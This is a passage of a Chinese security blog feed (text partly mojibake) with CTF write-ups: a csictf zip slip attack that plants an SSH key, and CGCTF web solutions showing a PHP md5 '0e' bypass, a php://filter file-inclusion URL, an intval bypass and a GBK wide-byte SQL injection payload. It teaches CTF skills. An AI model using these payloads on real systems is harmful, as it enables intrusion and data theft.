.ssh&#x2F;authorized_keys2 to be disregarded by default in future.</span><br><span class="line">#AuthorizedKeysFile\t.ssh&#x2F;authorized_keys .ssh&#x2F;authorized_keys2</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"># csictf&#123;cu5t0m_4uth0rizat10n&#125;</span><br><span class="line">AuthorizedKeysCommand &#x2F;usr&#x2F;local&#x2F;bin&#x2F;userkeys.sh</span><br><span class="line">AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in &#x2F;etc&#x2F;ssh&#x2F;ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#39;t trust ~&#x2F;.ssh&#x2F;known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#39;t read the user&#39;s ~&#x2F;.rhosts and ~&#x2F;.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line"></span><br><span class="line"># Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"># some PAM modules and threads)</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"></span><br><span class="line"># Kerberos options</span><br><span class="line">#KerberosAuthentication no</span><br><span class="line">#KerberosOrLocalPasswd yes</span><br><span class="line">#KerberosTicketCleanup yes</span><br><span class="line">#KerberosGetAFSToken no</span><br><span class="line"></span><br><span class="line"># GSSAPI options</span><br><span class="line">#GSSAPIAuthentication no</span><br><span class="line">#GSSAPICleanupCredentials yes</span><br><span class="line">#GSSAPIStrictAcceptorCheck yes</span><br><span class="line">#GSSAPIKeyExchange no</span><br><span class="line"></span><br><span class="line"># Set this to &#39;yes&#39; to enable PAM authentication, account processing,</span><br><span class="line"># and session processing. If this is enabled, PAM authentication will</span><br><span class="line"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="line"># PasswordAuthentication. Depending on your PAM configuration,</span><br><span class="line"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="line"># the setting of \&quot;PermitRootLogin without-password\&quot;.</span><br><span class="line"># If you just want the PAM account and session checks to run without</span><br><span class="line"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="line"># and ChallengeResponseAuthentication to &#39;no&#39;.</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#AllowAgentForwarding yes</span><br><span class="line">#AllowTcpForwarding yes</span><br><span class="line">#GatewayPorts no</span><br><span class="line">X11Forwarding yes</span><br><span class="line">#X11DisplayOffset 10</span><br><span class="line">#X11UseLocalhost yes</span><br><span class="line">#PermitTTY yes</span><br><span class="line">PrintMotd no</span><br><span class="line">#PrintLastLog yes</span><br><span class="line">#TCPKeepAlive yes</span><br><span class="line">#PermitUserEnvironment no</span><br><span class="line">#Compression delayed</span><br><span class="line">#ClientAliveInterval 0</span><br><span class="line">#ClientAliveCountMax 3</span><br><span class="line">#UseDNS no</span><br><span class="line">#PidFile &#x2F;var&#x2F;run&#x2F;sshd.pid</span><br><span class="line">#MaxStartups 10:30:100</span><br><span class="line">#PermitTunnel no</span><br><span class="line">#ChrootDirectory none</span><br><span class="line">#VersionAddendum none</span><br><span class="line"></span><br><span class="line"># no default banner path</span><br><span class="line">#Banner none</span><br><span class="line"></span><br><span class="line"># Allow client to pass locale environment variables</span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line"></span><br><span class="line"># override default of no subsystems</span><br><span class="line">Subsystem\tsftp\t&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;sftp-server</span><br><span class="line"></span><br><span class="line"># Example of overriding settings on a per-user basis</span><br><span class="line">#Match User anoncvs</span><br><span class="line">#\tX11Forwarding no</span><br><span class="line">#\tAllowTcpForwarding no</span><br><span class="line">#\tPermitTTY no</span><br><span class="line">#\tForceCommand cvs server&quot;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­åŒ…å«äº†HTB 0x05çš„flagï¼š<code>csictf&#123;cu5t0m_4uth0rizat10n&#125;</code></p>
<p>æ¥ç€çœ‹<code>/usr/local/bin/userkeys.sh</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">if [ \&quot;$1\&quot; &#x3D;&#x3D; \&quot;csictf\&quot; ]; then</span><br><span class="line">        cat &#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;*</span><br><span class="line">else</span><br><span class="line">        echo \&quot;\&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®çš„æ„æ€åº”è¯¥è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªPublic Keyåˆ°<code>/home/administrator/uploads/keys/</code>ï¼Œç„¶åç”¨sshç™»å½•ï¼Œèƒ½ä¸Šä¼ çš„åœ°æ–¹å°±åªæœ‰ä¹‹å‰é‚£ä¸ªzip uploadã€‚çœ‹èµ›åçš„wpï¼Œè¿™é‡Œç”¨åˆ°çš„æ˜¯zip slipæ¼æ´ï¼š<a href="https://github.com/snyk/zip-slip-vulnerability">Zip Slip Vulnerability</a></p>
<p>å…ˆåœ¨æœ¬æœºä¸Šç”Ÿæˆä¸€ä¸ªssh public keyï¼Œç„¶åç‰¹æ®Šçš„zipå‹ç¼©æ–‡ä»¶ï¼Œä¸Šä¼ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa     #filename:my_key</span><br><span class="line">$ 7z a zip-slip.zip my_key.pub</span><br><span class="line">$ 7z rn zip-slip.zip my_key.pub &#39;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;administrator&#x2F;uploads&#x2F;keys&#x2F;dunsp4rce.pub&#39;</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>&#123;success: true&#125;</code></p>
<p>å†sshç™»å½•ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹å¾—åˆ°HTB 0x03çš„flag</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728135732.png" alt=""></p>
<p>æ¥ç€å°±æ˜¯å»<code>/home</code>ç›®å½•ä¸‹æ‰¾å„ç§æ–‡ä»¶äº†</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728135914.png" alt=""></p>
<p>åœ¨<code>/home/administrator/website/models/db.js</code>ä¸­å‘ç°HTB 0x06çš„flagã€‚</p>
<p>å¹¶ä¸”è¿˜ç»™å‡ºäº†mongodbç™»å½•çš„å£ä»¤</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200728140033.png" alt=""></p>
<p>æ‹¿åˆ°HTB 0x04çš„flagã€‚</p>
<h2 id="Reference">Reference</h2>
<p><a href="https://dunsp4rce.github.io/csictf-2020/">https://dunsp4rce.github.io/csictf-2020/</a></p>
<p><a href="https://github.com/team0se7en/CTF-Writeups/tree/master/csictf2020/">https://github.com/team0se7en/CTF-Writeups/tree/master/csictf2020/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Writeupä¹‹CGCTF</title>
    <url>/Web_security/ctf_writeup/3.CGCTF-Writeup/</url>
    <content><![CDATA[<h1 id="CGCTF-Writeup-Web">CGCTF Writeup Web</h1>
<p>å·²ç»å†³å®šå¼€å§‹èµ°ä¸Šäº†CTFçš„ä¸å½’è·¯äº†ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªç»ƒæ‰‹çš„CTFï¼Œæ¯”è¾ƒé€‚åˆæ–°æ‰‹å…¥é—¨å­¦ä¹ ï¼Œæœ‰å‡ é“é¢˜ä¹Ÿæ˜¯çœ‹çš„ç½‘ä¸Šçš„Writeupï¼Œæ€»çš„æ¥è¯´ä¸æ˜¯å¾ˆéš¾å§ï¼Œé‡åœ¨æ€»ç»“ç»éªŒå’Œç»•è¿‡å§¿åŠ¿ã€‚</p>
<p><a href="https://cgctf.nuptsast.com/challenges#Web">ä¼ é€é—¨</a></p>
<h3 id="Web">Web</h3>
<h4 id="ç­¾åˆ°é¢˜">ç­¾åˆ°é¢˜</h4>
<h5 id="é¢˜å¹²">é¢˜å¹²</h5>
<p>è¿™ä¸€å®šæ˜¯æœ€ç®€å•çš„</p>
<h5 id="é¢˜è§£">é¢˜è§£</h5>
<p>ç›´æ¥F12æŸ¥çœ‹æºä»£ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113130246.png" alt=""></p>
<p>**flagï¼š<code>nctf&#123;flag_admiaanaaaaaaaaaaa&#125;</code> **</p>
<h4 id="md5-collision">md5 collision</h4>
<h5 id="é¢˜å¹²-v2">é¢˜å¹²</h5>
<p>æºç ï¼ˆPHPï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$md51 = md5(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£-v2">é¢˜è§£</h5>
<p>çœ‹æºç çš„æ„æ€å°±æ˜¯ï¼Œè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª<code>id</code>ï¼Œè¿™ä¸ª<code>id</code>çš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ï¼Œä½†æ˜¯ä»–ä»¬çš„md5ç æ˜¯ç›¸åŒçš„ã€‚</p>
<blockquote>
<p>===æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼å’Œç±»å‹ï¼›</p>
<p>==æ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„å€¼,ä¸æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚</p>
</blockquote>
<p>é¦–å…ˆçœ‹ä¸€ä¸‹<code>QNKCDZO</code>çš„md5ç æ˜¯ä»€ä¹ˆï¼š<code>0e830400451993494058024219903391</code>ã€‚</p>
<blockquote>
<p>md5ç¢°æ’åŸç†ï¼šä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼ŒPHPä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒã€‚PHPè½¬æ¢çš„è§„åˆ™çš„æ˜¯ï¼šè‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œè‹¥æ— åˆ™è¾“å‡º0ã€‚ä¾‹å¦‚ï¼š123abcè½¬æ¢ååº”è¯¥æ˜¯123ï¼Œè€Œabcåˆ™ä¸º0ï¼Œ0==0è¿™å½“ç„¶æ˜¯æˆç«‹çš„ã€‚æ‰€ä»¥ï¼Œ0 ==â€™abcâ€™æ˜¯æˆç«‹çš„ã€‚å½“æœ‰ä¸€ä¸ªå¯¹æ¯”å‚æ•°æ˜¯æ•´æ•°çš„æ—¶å€™ï¼Œä¼šæŠŠå¦å¤–ä¸€ä¸ªå‚æ•°å¼ºåˆ¶è½¬æ¢ä¸ºæ•´æ•°ã€‚</p>
</blockquote>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°md5åŠ å¯†åä»¥<code>0e</code>å¼€å¤´çš„å­—ç¬¦ä¸²å°±å¯ä»¥ç»•è¿‡<code>==</code>çš„åˆ¤æ–­äº†ï¼Œè¿™é‡Œç»™å¤§å®¶åˆ—ä¸¾äº†ä¸€å†™ï¼š<a href="https://blog.csdn.net/qq_38603541/article/details/97108663">å¸¸è§çš„MD5ç¢°æ’ï¼šmd5å€¼ä¸º0eå¼€å¤´</a></p>
<blockquote>
<p>ä¸ä¹‹ç±»ä¼¼çš„è¿˜æœ‰sha1ï¼š aaroZmOk aaK1STfY aaO8zKZF aaO8zKZF aa3OFF9mï¼Œè¿™å‡ ä¸ªå­—ç¬¦ä¸²ç»è¿‡sha1åŠ å¯†åä¹Ÿæ˜¯<code>0e</code>å¼€å¤´ã€‚</p>
</blockquote>
<p>**flagï¼š<code>nctf&#123;md5_collision_is_easy&#125;</code> **</p>
<h4 id="ç­¾åˆ°2">ç­¾åˆ°2</h4>
<p>æç¤ºè¾“å…¥å£ä»¤ã€‚</p>
<p>å…ˆæŠŠè¾“å…¥æ¡†çš„ç±»å‹æ”¹ä¸º<code>text</code>ï¼Œå¯ä»¥å‘ç°åªèƒ½è¾“å…¥10ä¸ªå­—ç¬¦ï¼Œå³è¾“å…¥æ¡†å¯¹è¾“å…¥é•¿åº¦è¿›è¡Œäº†é™åˆ¶ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113180855.png" alt=""></p>
<p>ä¿®æ”¹ä¸€ä¸‹æœ€å¤§é•¿åº¦ï¼Œè¾“å…¥<code>zhimakaimen</code>å³å¯ã€‚</p>
<p><strong>flagï¼š<code>nctf&#123;follow_me_to_exploit&#125;</code></strong></p>
<h4 id="è¿™é¢˜ä¸æ˜¯Web">è¿™é¢˜ä¸æ˜¯Web</h4>
<p>ç½‘é¡µä¸­ç»™äº†ä¸€å¼ å›¾ç‰‡ï¼Œå¹¶ä¸”æç¤ºè¿™é“é¢˜ä¸æ˜¯Webï¼Œå¯ä»¥è”æƒ³åˆ°å¯èƒ½æ˜¯å›¾ç‰‡éšå†™æœ¯ã€‚ç›´æ¥Downloadå›¾ç‰‡ï¼Œç”¨Notepad++æ‰“å¼€ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113181427.png" alt=""></p>
<p><strong>flagï¼š<code>nctf&#123;photo can also hid3 msg&#125;</code></strong></p>
<h4 id="å±‚å±‚é€’è¿›">å±‚å±‚é€’è¿›</h4>
<p>ä½¿ç”¨F12æŸ¥çœ‹æºä»£ç ï¼Œæ ¹æ®é¢˜ç›®æç¤ºâ€œå±‚å±‚é€’è¿›â€ï¼Œè¿™é“é¢˜ä½¿ç”¨<code>iframe</code>æ ‡ç­¾å¯¹é¡µé¢è¿›è¡ŒåµŒå¥—ï¼Œæ‰¾åˆ°æœ€åä¸€ä¸ª404.htmlé¡µé¢ï¼Œç«Ÿç„¶æç¤ºæˆ‘æŸ¥çœ‹ä¸Šä¸€ä¸ªé¡µé¢ã€‚åŸè°…æˆ‘çœ¼çï¼Œæ‰¾äº†å¥½ä¹…ï¼Œå‘ç°éšè—åœ¨æ³¨é‡Šé‡Œé¢ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113183453.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113183754.png" alt=""></p>
<p><strong>flagï¼š<code>nctf&#123;this_is_a_fl4g&#125;</code></strong></p>
<h4 id="AAencode">AAencode</h4>
<h5 id="é¢˜å¹²-v3">é¢˜å¹²</h5>
<p>javascript aaencode</p>
<h5 id="é¢˜è§£-v3">é¢˜è§£</h5>
<p>ä¸Šç½‘æœä¸€ä¸‹<code>javascript aaencode</code>ï¼Œå‘ç°æ˜¯ä¸€ç§é¢œæ–‡å­—ï¼š</p>
<ul>
<li>JJencodeï¼šå°†JSä»£ç è½¬æ¢æˆåªæœ‰ç¬¦å·çš„å­—ç¬¦ä¸²</li>
<li>AAencodeï¼šå°†JSä»£ç è½¬æ¢æˆå¸¸ç”¨çš„ç½‘ç»œç¬¦å·</li>
</ul>
<p>AAencodeåŠ å¯†ç½‘å€ï¼š <a href="http://utf-8.jp/public/aaencode.html">http://utf-8.jp/public/aaencode.html</a></p>
<p>è§£å¯†æ–¹æ³•ï¼šä»¥ç›´æ¥åˆ©ç”¨æµè§ˆå™¨çš„æ§åˆ¶å°è¾“å…¥å¯†æ–‡ï¼Œæ‰§è¡Œåå³å¯è§£å¯†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113184447.png" alt=""></p>
<h4 id="å•èº«äºŒåå¹´">å•èº«äºŒåå¹´</h4>
<h5 id="é¢˜å¹²-v4">é¢˜å¹²</h5>
<p>è¿™é¢˜å¯ä»¥é æŠ€æœ¯ä¹Ÿå¯ä»¥é æ‰‹é€Ÿï¼ è€å¤«å•èº«äºŒåå¹´ï¼Œè‡ªç„¶é çš„æ˜¯æ‰‹é€Ÿï¼</p>
<h5 id="é¢˜è§£-v4">é¢˜è§£</h5>
<p>çœ‹åˆ°ä¸€ä¸ªé“¾æ¥ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œè¯¥é“¾æ¥æŒ‡å‘<code>./search_key.php</code></p>
<p>ç‚¹å‡»é“¾æ¥ï¼Œæˆ‘ä»¬å´å»åˆ°äº†<code>./no_key_is_here_forever.php</code>è¿™ä¸ªé¡µé¢</p>
<p>çŒœæµ‹æ˜¯302è·³è½¬ã€‚</p>
<p>ä½¿ç”¨Burp SuiteæŠ“åŒ…ï¼ŒæŸ¥çœ‹Sitemapï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113185357.png" alt=""></p>
<p>**flagï¼š<code>nctf&#123;yougotit_script_now&#125;</code> **</p>
<h4 id="PHP-decode">PHP decode</h4>
<h5 id="é¢˜å¹²-v5">é¢˜å¹²</h5>
<p>è§åˆ°çš„ä¸€ä¸ªç±»ä¼¼ç¼–ç çš„shellï¼Œè¯·è§£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span>(<span class="params">$ZzvSWE</span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">    $ZzvSWE = (base64_decode($ZzvSWE));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"> </span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="é¢˜è§£-v5">é¢˜è§£</h5>
<p>è¿™é“é¢˜ç›´æ¥æ‹¿åˆ°æœ¬åœ°è¿è¡Œè¿™æ®µä»£ç flagä¸å°±å‡ºæ¥äº†-_-</p>
<p><strong>flag:nctf{gzip_base64_hhhhhh}</strong></p>
<h4 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h4>
<h5 id="é¢˜å¹²-v6">é¢˜å¹²</h5>
<p>æ²¡é”™ è¿™å°±æ˜¯ä¼ è¯´ä¸­çš„LFI</p>
<h5 id="é¢˜è§£-v6">é¢˜è§£</h5>
<p>æœ‰å…³æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨æˆ‘åœ¨å¦å¤–ä¸€ç¯‡åšæ–‡å¾ˆè¯¦ç»†çš„ä»‹ç»äº†ï¼Œå¯ä»¥<a href="http://ca0y1h.top/2019/11/15/Week13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/">ç§»æ­¥äºæ­¤</a>ã€‚</p>
<p>æŸ¥çœ‹index.phpé¡µé¢çš„æºä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4.chinalover.sinaapp.com&#x2F;web7&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>æŠŠç»“æœç»è¿‡base64è§£ç åå¾—åˆ°æºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥ç›´æ¥åˆ°<strong>flag:<code>nctf&#123;edulcni_elif_lacol_si_siht&#125;</code></strong></p>
<h4 id="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨">å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨</h4>
<p>ä¸ç¬¬7é¢˜ç±»ä¼¼</p>
<p><strong>flag: <code>nctf&#123;this_is_302_redirect&#125;</code></strong></p>
<h4 id="Cookie">Cookie</h4>
<h5 id="é¢˜å¹²-v7">é¢˜å¹²</h5>
<p>COOKIEå°±æ˜¯ç”œé¥¼çš„æ„æ€~</p>
<p>TIP: 0==not</p>
<h5 id="é¢˜è§£-v7">é¢˜è§£</h5>
<p>F12æŸ¥çœ‹requestæ•°æ®åŒ…ä¸­çš„cookieå­—æ®µï¼Œå‘ç°<code>Login=0</code>ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191113211310.png" alt=""></p>
<p>ç”¨BurpSuitæŠ“åŒ…ä¿®æ”¹<code>cookie</code>å‚æ•°<code>Login=1</code>å³å¯ã€‚</p>
<p><strong>flag:<code>nctf&#123;cookie_is_different_from_session&#125;</code></strong></p>
<h4 id="MySQL">MySQL</h4>
<h5 id="é¢˜å¹²-v8">é¢˜å¹²</h5>
<p>ä¸èƒ½æ¯ä¸€é¢˜éƒ½è¿™ä¹ˆç®€å•å˜› ä½ è¯´æ˜¯ä¸æ˜¯ï¼Ÿ</p>
<p>é¡µé¢æç¤º<code>Do you know robots.txtï¼Ÿ</code></p>
<p>äºæ˜¯è®¿é—®<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
<p>è¿”å›ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åˆ«å¤ªå¼€å¿ƒï¼Œflagä¸åœ¨è¿™ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ç”¨é€”ä½ çœ‹å®Œäº†ï¼Ÿ</span><br><span class="line">åœ¨CTFæ¯”èµ›ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å¾€å¾€å­˜æ”¾ç€æç¤ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">TIP:sql.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id &#x3D; intval($_GET[id]);</span><br><span class="line">  $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;));</span><br><span class="line">  if ($_GET[id]&#x3D;&#x3D;1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>åº”è¯¥æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª<code>id</code>ï¼Œä½†ä»–çš„å€¼ä¸ç­‰äº<code>1024</code>ï¼Œä½†æ˜¯<code>intval</code>ä¹‹åå’Œ<code>1024</code>ç›¸ç­‰ï¼Œé‚£ä¹ˆåªè¦çŸ¥é“<code>intval()</code>å‡½æ•°å–æ•´ï¼Œå°±å¾ˆå®¹æ˜“äº†ã€‚</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chinalover.sinaapp.com&#x2F;web11&#x2F;sql.php?id&#x3D;1024.1</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>flag:nctf&#123;query_in_mysql&#125;</code></p>
<blockquote>
<p>æˆ‘æœ€å…ˆå¼€å§‹æ²¡æœ‰æ³¨æ„åˆ°è¿˜æœ‰ä¸€ä¸ªæç¤ºï¼š<code>TIP:sql.php</code>ï¼Œå¯¼è‡´æˆ‘åœ¨å…¶ä»–è·¯å¾„æµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚</p>
</blockquote>
<h4 id="GBK-Injection">GBK Injection</h4>
<p>æ ¹æ®é¢˜ç›®å¾ˆå®¹æ˜“å°±èƒ½æƒ³åˆ°è¿™æ˜¯è€ƒå¯Ÿå®½å­—èŠ‚æ³¨å…¥ï¼Œå…ˆæ¥ç¨å¾®çš„ä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯å®½å­—èŠ‚æ³¨å…¥ã€‚</p>
<p>å®½å­—èŠ‚æ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸PHPç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚ä¾‹å¦‚è¯´PHPçš„ç¼–ç ä¸º <code>UTF-8</code>è€Œ<code>MySql</code>çš„ç¼–ç è®¾ç½®ä¸ºäº†<br>
<code>SET NAMES 'gbk'</code>æˆ–æ˜¯ <code>SET character_set_client =gbk</code>ï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚å…·ä½“æ¥è¯´ï¼Œå‡å¦‚æŸä¸ªç½‘ç«™æœ‰å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æäº¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶,å‡å¦‚æˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„æ˜¯<code>addslashes</code>æ¥è¿‡æ»¤,é‚£ä¹ˆå°±ä¼šå‘ç”Ÿå¦‚ä¸‹çš„è½¬æ¢è¿‡ç¨‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(æ•°æ®åº“GBK)&#x3D;&#x3D;&#x3D;&gt;é‹&#39;</span><br></pre></td></tr></table></figure>
